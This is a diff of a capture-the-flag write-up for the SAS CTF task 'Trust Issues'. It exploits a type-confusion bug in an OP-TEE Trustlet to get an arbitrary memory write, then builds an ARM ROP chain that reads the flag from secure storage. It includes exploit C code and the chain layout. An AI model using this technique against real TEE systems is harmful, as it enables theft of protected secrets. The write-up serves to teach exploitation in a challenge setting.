@@ -1,7 +1,4 @@
-﻿
-
-
-# Trust Issues
+﻿# Trust Issues
 
 ## Description 
 Target system is a secure-world Trustlet running inside a TEE. The codebase is signed, verified, and marked "production ready." But something doesn't add up.
@@ -30,6 +27,8 @@ For more information about OP-TEE and environment setup look at [Broken Trust wr
 Once again, thanks to @wx0rx and @phoen1xxx for collaborating on this task with the author of this writeup and thanks to @m4drat for OP-TEE tasks and to SAS CTF organizers for the CTF at all
 
 ## Understanding the task
+
+![](./assets/adventure.png)
 
 ### Back to the future
 Originally, this task served as the first in a series of two OP-TEE related tasks and we solved it first during the CTF. However, since the second task, Broken Trust, is broader in scope, the core details about OP-TEE and environment setup are covered there. Here, many components will be reused with references to Broken Trust — though initially, most of what’s described there was developed while working on this task
@@ -243,7 +242,10 @@ LABEL_17:
   __asm { POP.W           {PC} }
   return result;
 ```
+
 Wait a minute... It's a good old Brainfuck! Almost it: jump operation `[` and `]` are missing.
+
+![](./assets/do_you_trust_me.png)
 
 So, the second command becomes clear: we can send reduced Brainfuck `code` that will read data from `input` buffer and write to `output` one.
 
@@ -258,6 +260,8 @@ After looking at `write_secure_object_cmd` we'll find out that there is type che
   {
 ``` 
 This type check is required based on the [way](https://globalplatform.org/wp-content/uploads/2010/07/TEE_Client_API_Specification-V1.0.pdf#%255B%257B%2522num%2522:89,%2522gen%2522:0%257D,%257B%2522name%2522:%2522XYZ%2522%257D,54,647,0%255D) clients interact with a Trustlet. However, `run_code_cmd` lacks such a check. An obvious question arises: What happens if we pass an integer value (`TEEC_VALUE_INPUT`) as a parameter expecting a buffer?
+
+![](./assets/confusion.png)
 
 The answer is just as obvious: the Trustlet will interpret the integer as a memory address. Worse, if we pass a number as an `output` parameter, the Trustlet’s Brainfuck command will write its `output` to the address represented by that number - effectively allowing writes to any address. This is type confusion vulnerability allowing Arbitrary Address Write (AAW).
 
@@ -325,6 +329,9 @@ int main(int argc, char *argv[])
 }
 ```
 #### Building
+
+![](./assets/the_engineer.png)
+
 Here is the script for building both OP-TEE project and client for out Trustlet ([build.sh](./solve/build.sh)):
 ```bash
 #!/bin/bash
@@ -348,7 +355,7 @@ fi
   $@
 ```
 #### Running
-Here is running script based on one the README from task's archive (run.sh):
+Here is running script based on one the README from task's archive ([run.sh](./solve/run.sh)):
 ```bash
 #!/bin/bash
 
@@ -378,6 +385,8 @@ b *run_code_cmd+314
 ```
 
 ### AAW
+
+![](./assets/aaw.png)
 
 To do AAW we can put data we want to write in `input` buffer, integer representing target address in `output` parameter and use Brainfuck `code` that will simply copy input to output (for example, by `,<.<` code blocks). Let's implement this idea in code:
 ```c
@@ -414,13 +423,15 @@ void aaw(uint64_t address, uint8_t* data, size_t sz)
     &op, &err_origin);
 }
 ```
-We decided to make `input` buffer of type `TEEC_MEMREF_TEMP_INOUT` to use him for Brainfuck `input` and flag returning at the same time.
-
 Now we have  primitive that allows arbitrary writes anywhere in the Trustlet's memory. But what exactly should we overwrite to achieve... well, achieve what exactly?
 
-As evident from the decompiled code, all functions conclude with an instruction that pops the `pc` register value from the stack. So, if we can write to the stack we can achieve code execution using ROP-chain.
+As evident from the decompiled code, all functions conclude with an instruction that pops the `pc` register value from the stack. 
+So, if we can write to the stack we can achieve code execution using [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) - execute some small usefull blocks of the Trustlet's code (gadgets) one by one in a chain. 
+To do that we need to write gadget's addresses to the right places in the stack so they can be executed after `pc` register pop.
 
 ### How to read the flag?
+
+![](./assets/trusted_storage.png)
 
 Assuming we've achieved code execution, the next challenge is retrieving the flag. Since we know the flag is stored in OP-TEE's secure storage, we'll need to execute a series of API calls similar to those in `write_secure_object_cmd`.
 
@@ -444,40 +455,79 @@ TEE_ReadObjectData(handle, // value for previous call
 ```
 All the functions we need to call are already present in the Trustlet image. Fortunately, there's no ASLR, so we can use any functions from the Trustlet image for building our ROP-chain.
 
-Beyond just calling functions, we need to solve another problem: how to transfer the read flag back to the client. This is crucial because we don't have access to Trustlet's logs on the remote machine. There is one existing data transfer method we've already seen in the Brainfuck command - we can write arbitrary data to the output buffer parameter.
+After some deeper Trustle's image research we figured out that API function we need to call is just simple wrappers over underlying system call functions:
+1. `TEE_OpenPersistentObject` -> `_utee_storage_obj_open`
+2. `TEE_ReadObjectData` -> `_utee_storage_obj_read`
 
-This leads us to another question: how can we "return" parameters from our TA back to the client within our ROP-chain? Through research, we discovered that OP-TEE kernel has a special syscall that exactly meets our needs. And, of course, this syscall is available in our Trustlet's image through the `_utee_return` function.
+We decided to use them in our execution for the simple reason - the less code we execute the less erros we will face.
+
+Beyond just calling functions, we need to solve another problem: how to transfer the read flag back to the client. 
+This is crucial because we don't have access to Trustlet's logs on the remote machine. 
+There is one existing data transfer method we've already seen in the Brainfuck command - we can write arbitrary data to the output buffer parameter.
+For this purpose we decided to make `input` buffer of type `TEEC_MEMREF_TEMP_INOUT` to use him for Brainfuck `input` and flag returning at the same time
+
+This leads us to another question: how can we return parameters from our TA back to the client within our ROP-chain? Through research, we discovered that OP-TEE kernel has a special syscall that exactly meets our needs. And, of course, this syscall is available in our Trustlet's image through the `_utee_return` function.
+
+Putting it all together and simplifying, we need to execute following code:
+```c
+char flagid[] = "flag";
+DWORD handle;
+_utee_storage_obj_open(TEE_STORAGE_PRIVATE, // 1
+	flagid, // address of "flag" string
+	strlen(flag), // 4
+	TEE_DATA_FLAG_ACCESS_READ, // 1
+	&handle // address of resulting handle
+);
+DWORD readsz;
+_utee_storage_obj_read(handle, // value from previous call
+	flag_address, // address somewhere inside the buffer we passed as input in client AAW code
+	sizeof(flag), // 0x100 (or any other value bigger than flag length)
+	&readsz // some writeable address
+);
+_utee_return();
+```
 
 ### ROP'n'roll 
+
+![](./assets/rop_chain.png)
 
 #### How to call function from ROP-chain?
 
 One problem prevents us from creating an x86-like ROP-chain: unlike x86, in ARM the function call instructions `bl` and `blx` don't push the return address on the stack. Instead, they use the `lr` register to store it. However, in our case all functions in the Trustlet's image push `lr` onto the stack themselves and pop it directly into the `pc` register at the function's end. 
 
-This means we can't use functions in our ROP-chain in the familiar way by just putting their address on the stack, because after such a "call" the function will store some junk value from the `lr` register and will jump there at the function end, causing us to lose control. To make our ROP-chain work properly, we need to adjust the addresses of functions we're going to call by skipping the prologue that saves the `lr` register. 
+This means we can't use functions in our ROP-chain in the familiar way by just putting their addresses on the stack, because after such a "call" the function will store some junk value from the `lr` register and will jump there at the function end, causing us to lose control. 
+To make our ROP-chain work properly, we need to adjust the addresses of functions we're going to call by skipping the prologue that saves the `lr` register. 
 
-To simplify things, we'll use lower-level syscall functions instead of API ones - they all have the same prologue and stack manipulation. Specifically, we'll use:
+Let's look how this prologue looks like in `_utee_storage_obj_open` function we need to call:
+```
+PUSH            {R5-R7,LR}
+MOV             R7, #0x29 ; ')'
+MOV             R6, #1
+ADD             R5, SP, #0x10+arg_0
+SVC             0
+POP             {R5-R7,PC}
+```
+As we can see, it pushes 3 registers and `lr` one after them and later pops them all.
+So, to call this function by address in the ROP-chain we need to:
+1. Skip first instruction pushing `lr` register - we'll shift function address by one `push` instruction size (4 bytes)
+2. Pop right address of the next gadget value in `pc` register after function return - we add 3 dwords (12 bytes) padding before the next gadget address.
 
-1. `_utee_storage_obj_open` instead of `TEE_OpenPersistentObject`
-2. `_utee_storage_obj_read` instead of `TEE_ReadObjectData`
-
-Both of these functions have the same prologue that pushes 4 registers including `lr`. This means that:
-
-1. We need to use the function address increased by 4 (size of 1 skipped instruction)
-2. We need to add 3 additional dwords after the address to put next gadget in the correct place
+Fortunatelly, it applies to both `_utee_storage_obj_open` and ` _utee_storage_obj_read` functions.
+With `_utee_return` everything is more simpler - we can just put it's address in place of next gadget address cause we don't need to return from this function or call any other gadgets.
 
 #### How to pass arguments to the function?
 
-We'll analyze the calling conventions by examining `TEE_OpenPersistentObject`. There is function-wrapper in Trustlet's image calling it. We can see how arguments are passed:
+We'll analyze the calling conventions by examining `TEE_OpenPersistentObject`. We can look how this function calls underlying `_utee_storage_obj_open`:
 ```
-STR             R3, [SP] ; object
-LDR             R3, [R7] ; flags
-LDR             R2, [R7,#4] ; objectIDLen
-LDR             R1, [R7,#8] ; objectID
-LDR             R0, [R7,#0xC] ; storageID
-BL              TEE_OpenPersistentObject
+STR             R3, [SP]
+LDR             R3, [R7,#8]
+LDR             R2, [R7,#0xC]
+LDR             R1, [R7,#0x10]
+LDR             R0, [R7,#0x14]
+BLX             _utee_storage_obj_open
 ```
-The first four arguments are stored in registers `r0`, `r1`, `r2`, and `r3` respectively. The 5th argument is stored at the top of the stack. From this, we can conclude that:
+The first four arguments are stored in registers `r0`, `r1`, `r2`, and `r3` respectively. 
+The 5th argument is stored at the top of the stack. From this, we can conclude that:
 
 1. The first four arguments are passed in registers `r0` through `r3`.
 2. Any additional arguments (5th and beyond) are passed on the stack.
@@ -494,7 +544,7 @@ Since we are going to transfer at least one argument in the stack, we also need 
 ```
 #### ROP-chain
 
-Now let's put it all together and build ours ROP-chain.
+Now let's put it all together and build the ROP-chain.
 
 Addresses we will use:
 ```c
@@ -563,6 +613,7 @@ Read the flag:
 Return from TA:
 ```c
   // Return from TA copying input buffer (it's INOUT) with flag back to client
+  // Can simply put it's address because we there is no return
   DW(RETURN);                                               // 60
 ```
 The rest of ROP-chain buffer we'll use to store flag storage object key:
@@ -573,9 +624,39 @@ The rest of ROP-chain buffer we'll use to store flag storage object key:
     flagkey, sizeof(flagkey));
 }
 ```
-### Flag
+### pwn3d
 
-Put all described above together, build it, run it remotely and... Retrieve the flag (almost real...):
+Now, we'll put our ROP-chain together with AAW to write it in the stack and execute code right after the `run_code_cmd` function return:
+```c
+void flag(const char* start)
+{
+  size_t start_len = strlen(start);
+  for (size_t i = 0; i < sizeof(input) - start_len; ++i)
+  {
+    if (!memcmp(input + i, start, start_len))
+    {
+      printf("%s\n", input + i);
+    }
+  }
+}
+
+void exploit(void)
+{
+  init();
+  genrop();
+  aaw(ROP_ADDRESS, (uint8_t*) rop, sizeof(rop));
+  flag("SAS");
+}
+
+int main(int argc, char *argv[])
+{
+  exploit();
+}
+```
+Build it, run remotely and successfully exploit the vulnerability and retrieve the flag:
+
 ```
 NE_SAS{mi_proebali_nastoyashi_flag_gde_to_pu_puti}
 ```
+
+![](./assets/fb.png)
